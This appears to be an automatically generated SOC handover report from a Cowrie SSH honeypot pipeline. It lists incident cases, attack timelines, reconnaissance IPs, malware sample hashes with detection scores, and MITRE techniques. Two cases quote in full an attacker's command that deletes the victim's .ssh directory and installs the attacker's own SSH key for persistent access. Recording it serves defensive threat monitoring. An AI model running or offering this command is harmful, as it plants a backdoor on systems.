| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:14:27` | `cowrie.session.connect` |
| `2026-04-16 15:14:27` | `cowrie.client.version` |
| `2026-04-16 15:14:28` | `cowrie.client.kex` |
| `2026-04-16 15:14:29` | `cowrie.login.success` |
| `2026-04-16 15:14:30` | `cowrie.session.params` |
| `2026-04-16 15:14:30` | `cowrie.command.input` |
| `2026-04-16 15:14:30` | `cowrie.command.failed` |
| `2026-04-16 15:14:30` | `cowrie.log.closed` |
| `2026-04-16 15:14:31` | `cowrie.session.params` |
| `2026-04-16 15:14:31` | `cowrie.command.input` |
| `2026-04-16 15:14:31` | `cowrie.session.file_download` |
| `2026-04-16 15:14:31` | `cowrie.log.closed` |
| `2026-04-16 15:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c84dca246b90

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:14 |
| **Last Seen** | 2026-04-16 15:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:14:34` | `cowrie.session.connect` |
| `2026-04-16 15:14:34` | `cowrie.client.version` |
| `2026-04-16 15:14:35` | `cowrie.client.kex` |
| `2026-04-16 15:14:36` | `cowrie.login.success` |
| `2026-04-16 15:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89ad3eca8b7e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:16 |
| **Last Seen** | 2026-04-16 15:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:16:22` | `cowrie.session.connect` |
| `2026-04-16 15:16:22` | `cowrie.client.version` |
| `2026-04-16 15:16:23` | `cowrie.client.kex` |
| `2026-04-16 15:16:24` | `cowrie.login.success` |
| `2026-04-16 15:16:24` | `cowrie.session.params` |
| `2026-04-16 15:16:24` | `cowrie.command.input` |
| `2026-04-16 15:16:24` | `cowrie.command.failed` |
| `2026-04-16 15:16:25` | `cowrie.log.closed` |
| `2026-04-16 15:16:25` | `cowrie.session.params` |
| `2026-04-16 15:16:25` | `cowrie.command.input` |
| `2026-04-16 15:16:26` | `cowrie.session.file_download` |
| `2026-04-16 15:16:26` | `cowrie.log.closed` |
| `2026-04-16 15:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14d4d8e8af2f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-16 15:16 |
| **Last Seen** | 2026-04-16 15:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 15:16:29` | `cowrie.session.connect` |
| `2026-04-16 15:16:29` | `cowrie.client.version` |
| `2026-04-16 15:16:29` | `cowrie.client.kex` |
| `2026-04-16 15:16:31` | `cowrie.login.success` |
| `2026-04-16 15:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.181[.]192` | **26** | 2026-04-16 14:29 | 2026-04-16 14:46 | 49m | 0 | `T1592` | 🟠 MEDIUM |
| `102.88.137[.]145` | **25** | 2026-04-16 14:27 | 2026-04-16 15:16 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `125.138.175[.]113` | **23** | 2026-04-16 13:56 | 2026-04-16 14:35 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.246.249[.]149` | 1 | 2026-04-16 14:39 | 2026-04-16 14:40 | 35s | 0 | `T1592` | 🟢 LOW |
| `49.64.242[.]249` | 1 | 2026-04-16 14:29 | 2026-04-16 14:31 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `102.88.137[.]145` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `120.48.181[.]192` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `125.138.175[.]113` | KR | Korea Telecom | **100** ⚠️ | 43 |
| `49.64.242[.]249` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `103.181.160[.]36` | IN | MONGA TELECOM | **64** | 0 |
| `91.107.252[.]128` | DE | Hetzner Online GmbH | 23 | 0 |
| `64.236.143[.]37` | US | Microsoft Limited | 2 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 122 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 48 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 47 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 24 |

---

## 🔕 False Positive Summary (28 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 151 cases |
| Tool 34  | Credential Extractor        | ✅ 95 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 9 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 28 filtered (18.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 9 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 47 priority case(s) shown individually · 5 recon entry/entries in table (3 group(s) consolidating 74 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-16T15:44:39Z_
